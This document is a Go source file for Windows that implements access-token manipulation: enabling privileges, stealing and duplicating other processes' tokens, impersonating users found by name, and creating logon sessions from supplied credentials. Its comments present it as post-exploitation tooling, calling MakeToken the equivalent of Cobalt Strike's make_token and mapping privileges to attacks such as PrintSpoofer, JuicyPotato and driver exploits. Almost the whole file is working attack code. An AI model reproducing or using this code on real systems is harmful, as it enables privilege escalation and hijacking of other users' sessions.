//go:build windows && amd64

// Package token 提供 Windows Token 操作。
package token

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32               = syscall.NewLazyDLL("advapi32.dll")
	procAdjustTokenPriv    = advapi32.NewProc("AdjustTokenPrivileges")
	procLookupPrivValue    = advapi32.NewProc("LookupPrivilegeValueW")
	procLookupPrivName     = advapi32.NewProc("LookupPrivilegeNameW")
	procDuplicateTokenEx   = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLogged  = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf       = advapi32.NewProc("RevertToSelf")
	procGetTokenInfo       = advapi32.NewProc("GetTokenInformation")
	procGetUserName        = advapi32.NewProc("GetUserNameW")
	procLogonUser          = advapi32.NewProc("LogonUserW")
)

const (
	SE_PRIVILEGE_ENABLED = 0x00000002
	TOKEN_QUERY          = 0x00000008
	TOKEN_ADJUST         = 0x00000020
	TOKEN_DUPLICATE      = 0x00000002
)

// TOKEN_PRIVILEGES 结构体
type tokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [1]luidAndAttributes
}

type luidAndAttributes struct {
	Luid       windows.LUID
	Attributes uint32
}

// EnablePrivilege 启用指定的 Token 权限。
func EnablePrivilege(privilege string) error {
	currentProc, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("GetCurrentProcess: %w", err)
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	err = windows.OpenProcessToken(currentProc, TOKEN_QUERY|TOKEN_ADJUST, &hToken)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	var luid windows.LUID
	privPtr, _ := syscall.UTF16PtrFromString(privilege)
	r, _, err := procLookupPrivValue.Call(
		uintptr(0),
		uintptr(unsafe.Pointer(privPtr)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValue(%s): %w", privilege, err)
	}

	tp := tokenPrivileges{
		PrivilegeCount: 1,
		Privileges: [1]luidAndAttributes{
			{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED},
		},
	}

	r, _, err = procAdjustTokenPriv.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)),
		0,
		0,
	)
	if r == 0 {
		return fmt.Errorf("AdjustTokenPrivileges(%s): %w", privilege, err)
	}

	return nil
}

// ImpersonateProcessToken 通过复制目标进程的 Token 来模拟用户。
func ImpersonateProcessToken(pid uint32) error {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, TOKEN_DUPLICATE|TOKEN_QUERY, &hToken)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	var hDup windows.Token
	r, _, err := procDuplicateTokenEx.Call(
		uintptr(hToken),
		uintptr(windows.MAXIMUM_ALLOWED),
		0,
		uintptr(2), // SecurityImpersonation
		uintptr(2), // TokenImpersonation (1=TokenPrimary, 2=TokenImpersonation)
		uintptr(unsafe.Pointer(&hDup)),
	)
	if r == 0 {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(hDup))

	r, _, err = procImpersonateLogged.Call(uintptr(hDup))
	if r == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser: %w", err)
	}

	return nil
}

// ImpersonateUser 通过用户名查找并模拟指定用户。
func ImpersonateUser(username string) error {
	// 枚举所有进程，检查 Token 用户名
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return fmt.Errorf("Process32First: %w", err)
	}

	for {
		hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, entry.ProcessID)
		if err == nil {
			var hToken windows.Token
			if err := windows.OpenProcessToken(hProcess, TOKEN_QUERY, &hToken); err == nil {
				user, _ := getTokenUser(hToken)
				hToken.Close()
				if strings.EqualFold(user, username) {
					windows.CloseHandle(hProcess)
					return ImpersonateProcessToken(entry.ProcessID)
				}
			}
			windows.CloseHandle(hProcess)
		}

		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}

	return fmt.Errorf("no process found for user: %s", username)
}

// RevToSelf 恢复为原始 Token。
func RevToSelf() error {
	r, _, err := procRevertToSelf.Call()
	if r == 0 {
		return fmt.Errorf("RevertToSelf: %w", err)
	}
	return nil
}

// MakeToken 使用指定凭据创建新登录会话并模拟。
// 相当于 Cobalt Strike 的 make_token 命令。
func MakeToken(domain, username, password string) error {
	domainPtr, _ := syscall.UTF16PtrFromString(domain)
	userPtr, _ := syscall.UTF16PtrFromString(username)
	passPtr, _ := syscall.UTF16PtrFromString(password)

	var hToken windows.Token
	r, _, err := procLogonUser.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(9), // LOGON32_LOGON_NEW_CREDENTIALS (远程凭据，不影响本地登录)
		uintptr(0), // LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return fmt.Errorf("LogonUser(%s\\%s): %w", domain, username, err)
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	r, _, err = procImpersonateLogged.Call(uintptr(hToken))
	if r == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser: %w", err)
	}

	return nil
}

// StealToken 复制目标进程的 Token 并永久模拟（使用 Primary Token）。
// 与 ImpersonateProcessToken 不同，StealToken 创建 Primary Token，
// 适合长期模拟（如服务进程）。
func StealToken(pid uint32) error {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, TOKEN_DUPLICATE|TOKEN_QUERY, &hToken)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	var hDup windows.Token
	r, _, err := procDuplicateTokenEx.Call(
		uintptr(hToken),
		uintptr(windows.MAXIMUM_ALLOWED),
		0,
		uintptr(2), // SecurityImpersonation (not SecurityIdentification)
		uintptr(1), // TokenPrimary
		uintptr(unsafe.Pointer(&hDup)),
	)
	if r == 0 {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(hDup))

	r, _, err = procImpersonateLogged.Call(uintptr(hDup))
	if r == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser: %w", err)
	}

	return nil
}

// TokenInfo 返回当前 Token 信息。
func TokenInfo() (string, error) {
	user, err := getCurrentUser()
	if err != nil {
		user = "unknown"
	}

	privs, _ := getPrivileges()
	integrity := getIntegrityLevel()

	return fmt.Sprintf("User: %s\nIntegrity: %s\nPrivileges:\n%s", user, integrity, privs), nil
}

func getCurrentUser() (string, error) {
	buf := make([]uint16, 256)
	size := uint32(len(buf))
	r, _, _ := procGetUserName.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	if r == 0 {
		return "", fmt.Errorf("GetUserName failed")
	}
	return syscall.UTF16ToString(buf[:size]), nil
}

func getTokenUser(hToken windows.Token) (string, error) {
	// First call to get required size
	var needed uint32
	err := windows.GetTokenInformation(hToken, windows.TokenUser, nil, 0, &needed)
	if err != windows.ERROR_INSUFFICIENT_BUFFER {
		return "", err
	}

	buf := make([]byte, needed)
	err = windows.GetTokenInformation(hToken, windows.TokenUser, &buf[0], uint32(len(buf)), &needed)
	if err != nil {
		return "", err
	}

	tokenUser := (*windows.Tokenuser)(unsafe.Pointer(&buf[0]))
	sid := tokenUser.User.Sid
	name, _, _, err := sid.LookupAccount("")
	return name, err
}

func getPrivileges() (string, error) {
	currentProc, err := windows.GetCurrentProcess()
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	err = windows.OpenProcessToken(currentProc, TOKEN_QUERY, &hToken)
	if err != nil {
		return "", err
	}
	defer hToken.Close()

	buf := make([]byte, 1024)
	var needed uint32
	err = windows.GetTokenInformation(hToken, windows.TokenPrivileges, &buf[0], uint32(len(buf)), &needed)
	if err != nil {
		return "", err
	}

	tokenPrivs := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))
	var sb strings.Builder
	for i := uint32(0); i < tokenPrivs.PrivilegeCount; i++ {
		nameLen := uint32(256)
		nameBuf := make([]uint16, nameLen)
		luid := tokenPrivs.Privileges[i].Luid
		r, _, _ := procLookupPrivName.Call(
			0,
			uintptr(unsafe.Pointer(&luid)),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
		)
		if r != 0 {
			attrs := tokenPrivs.Privileges[i].Attributes
			enabled := ""
			if attrs&SE_PRIVILEGE_ENABLED != 0 {
				enabled = " [ENABLED]"
			}
			sb.WriteString(syscall.UTF16ToString(nameBuf[:nameLen]) + enabled + "\n")
		}
	}
	return sb.String(), nil
}

func getIntegrityLevel() string {
	currentProc, _ := windows.GetCurrentProcess()
	if currentProc == 0 {
		return "Unknown"
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	windows.OpenProcessToken(currentProc, TOKEN_QUERY, &hToken)
	defer hToken.Close()

	buf := make([]byte, 64)
	var needed uint32
	err := windows.GetTokenInformation(hToken, windows.TokenIntegrityLevel, &buf[0], uint32(len(buf)), &needed)
	if err != nil {
		return "Unknown"
	}

	tokenMandatoryLabel := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&buf[0]))
	sid := tokenMandatoryLabel.Label.Sid
	rid := sid.SubAuthority(uint32(sid.SubAuthorityCount()) - 1)

	switch rid {
	case 0x0000:
		return "Untrusted"
	case 0x1000:
		return "Low"
	case 0x2000:
		return "Medium"
	case 0x3000:
		return "High"
	case 0x4000:
		return "System"
	default:
		return fmt.Sprintf("Unknown (RID: 0x%X)", rid)
	}
}

// CommonPrivileges 是常用的 Windows 权限列表。
var CommonPrivileges = map[string]string{
	"SeDebugPrivilege":            "允许调试/访问其他进程 - 进程注入需要",
	"SeImpersonatePrivilege":      "允许模拟其他用户 - PrintSpoofer 需要",
	"SeAssignPrimaryTokenPrivilege": "允许分配主 Token - JuicyPotato 需要",
	"SeTcbPrivilege":              "充当操作系统的一部分 - 极少分配",
	"SeLoadDriverPrivilege":       "允许加载/卸载驱动 - 驱动漏洞利用需要",
	"SeBackupPrivilege":           "允许备份文件 - 可绕过文件权限读取敏感文件",
	"SeRestorePrivilege":          "允许恢复文件 - 可覆盖系统文件",
	"SeTakeOwnershipPrivilege":    "允许获取对象所有权 - 可修改文件权限",
}

// IntegrityLevel 描述完整性级别。
var IntegrityLevel = map[string]string{
	"Untrusted":   "S-1-16-0 (最低权限)",
	"Low":         "S-1-16-4096 (IE 保护模式)",
	"Medium":      "S-1-16-8192 (普通用户进程)",
	"High":        "S-1-16-12288 (管理员权限)",
	"System":      "S-1-16-16384 (SYSTEM 权限)",
	"Protected":   "PPL (Protected Process Light)",
}
